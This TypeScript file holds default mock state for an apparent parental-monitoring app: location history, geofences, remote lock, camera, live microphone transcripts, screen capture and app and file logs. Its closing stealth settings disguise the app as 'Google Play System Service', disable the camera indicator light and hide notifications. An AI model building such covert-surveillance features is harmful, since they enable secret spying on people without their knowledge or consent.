import { ChildDeviceState } from './types';

export const DEFAULT_DEVICE_STATE: ChildDeviceState = {
  deviceId: "DEV-CHILD-9841",
  pairingCode: "592-104",
  childName: "Child Device",
  childAge: 12,
  deviceModel: "Samsung Galaxy A54",
  osVersion: "Android 14 (One UI 6.1)",
  isOnline: true,
  lastSeen: "Just now",
  batteryLevel: 88,
  isCharging: false,
  wifiName: "Home_5G_Network",
  storageUsedPercent: 42,
  storageUsedGB: 53.8,
  storageTotalGB: 128,

  location: {
    lat: 23.8103,
    lng: 90.4125,
    address: "Dhaka Central • Live GPS Receiver Active",
    speed: 0,
    accuracy: 4,
    altitude: 12,
    timestamp: new Date().toISOString(),
    batteryAtLocation: 88
  },
  locationHistory: [
    {
      lat: 23.8103,
      lng: 90.4125,
      address: "Dhaka Central (Current Location)",
      speed: 0,
      accuracy: 4,
      timestamp: new Date().toISOString(),
      batteryAtLocation: 88
    },
    {
      lat: 23.8120,
      lng: 90.4140,
      address: "Main Road • Moving (Walk)",
      speed: 4,
      accuracy: 6,
      timestamp: new Date(Date.now() - 15 * 60 * 1000).toISOString(),
      batteryAtLocation: 90
    }
  ],
  geofences: [
    {
      id: "gf-home",
      name: "Home Safe Zone",
      lat: 23.8103,
      lng: 90.4125,
      radiusMeters: 300,
      type: "safe",
      activeAlert: false,
      createdAt: new Date().toISOString()
    },
    {
      id: "gf-school",
      name: "School Campus Area",
      lat: 23.8145,
      lng: 90.4180,
      radiusMeters: 450,
      type: "safe",
      activeAlert: false,
      createdAt: new Date().toISOString()
    }
  ],

  isLocked: false,
  lockReason: "",
  customLockMessage: "Screen lock enabled by Parent. Time for homework or rest!",

  activeCamera: "off",
  isCameraStreaming: false,
  latestCameraSnapshot: null,
  cameraSnapshotTimestamp: undefined,
  cameraSnapshots: [],

  audioState: {
    isListening: false,
    decibelLevel: 28,
    audioMode: 'off',
    lastTranscript: "Live hardware microphone ready. Click Start Live Voice Listening to stream.",
    recordedClipsCount: 2,
    recordedClips: [
      {
        id: "clip-initial-1",
        title: "Classroom Study Ambient",
        timestamp: "Today, 10:15 AM",
        duration: "00:30",
        transcript: "Teacher explaining science chapter. Child studying quietly.",
        severity: "safe"
      },
      {
        id: "clip-initial-2",
        title: "School Recess Ambient",
        timestamp: "Today, 01:20 PM",
        duration: "00:45",
        transcript: "Conversations with friends about afternoon football game.",
        severity: "safe"
      }
    ]
  },

  isScreenMonitoring: true,
  currentApp: "Chrome Browser",
  currentScreenTitle: "kids.nationalgeographic.com",
  currentScreenContent: "Explore amazing facts about wild animals, science, space, and historic events.",
  currentScreenImage: null,

  aiSafetyStatus: {
    timestamp: new Date().toISOString(),
    riskLevel: "SAFE",
    safetyScore: 98,
    detectedCategories: ["Educational", "Science & Nature"],
    summary: "Screen content is educational and child-safe. No harmful keywords or risk factors found.",
    suggestedAction: "No parental action required. Content is safe."
  },

  blockedApps: [],

  appUsageLogs: [
    {
      id: "app-chrome",
      appName: "Google Chrome",
      packageName: "com.android.chrome",
      category: "Browser",
      durationMinutes: 75,
      lastUsed: "Just now",
      isBlocked: false,
      isFlagged: false,
      icon: "globe"
    },
    {
      id: "app-youtube",
      appName: "YouTube Kids",
      packageName: "com.google.android.apps.youtube.kids",
      category: "Entertainment",
      durationMinutes: 45,
      lastUsed: "20 min ago",
      isBlocked: false,
      isFlagged: false,
      icon: "youtube"
    },
    {
      id: "app-duolingo",
      appName: "Duolingo",
      packageName: "com.duolingo",
      category: "Education",
      durationMinutes: 30,
      lastUsed: "1 hour ago",
      isBlocked: false,
      isFlagged: false,
      icon: "message-square"
    },
    {
      id: "app-roblox",
      appName: "Roblox",
      packageName: "com.roblox.client",
      category: "Games",
      durationMinutes: 20,
      lastUsed: "3 hours ago",
      isBlocked: false,
      isFlagged: true,
      icon: "gamepad-2"
    }
  ],

  fileSystem: [
    {
      id: "file-1",
      name: "science_project_notes.pdf",
      folder: "Documents",
      size: "1.4 MB",
      date: "Today, 09:30 AM",
      isFlagged: false
    },
    {
      id: "file-2",
      name: "school_campus_photo.jpg",
      folder: "Photos",
      size: "3.2 MB",
      date: "Yesterday, 04:15 PM",
      isFlagged: false
    },
    {
      id: "file-3",
      name: "biology_revision_audio.wav",
      folder: "Voice Recordings",
      size: "4.8 MB",
      date: "2 days ago",
      isFlagged: false
    }
  ],

  activityHistory: [
    {
      id: "log-init-1",
      timestamp: "Just now",
      type: "permission",
      title: "Guardian Shield Synchronized",
      message: "Child phone connected to Guardian Shield secure cloud sync daemon.",
      severity: "info"
    },
    {
      id: "log-init-2",
      timestamp: "10 min ago",
      type: "location",
      title: "GPS Location Updated",
      message: "Child device within Home Safe Zone (Dhaka Central).",
      severity: "info"
    }
  ],

  stealthSettings: {
    autoHideApp: true,
    isAppHidden: false,
    disguiseName: "Google Play System Service",
    sensorLightDisabled: true,
    hideNotificationBadge: true,
    runInBackground: true,
    permissionsGranted: {
      location: true,
      camera: true,
      microphone: true,
      storage: true,
      accessibility: true,
      deviceAdmin: true,
      usageStats: true,
      drawOverApps: true
    }
  }
};
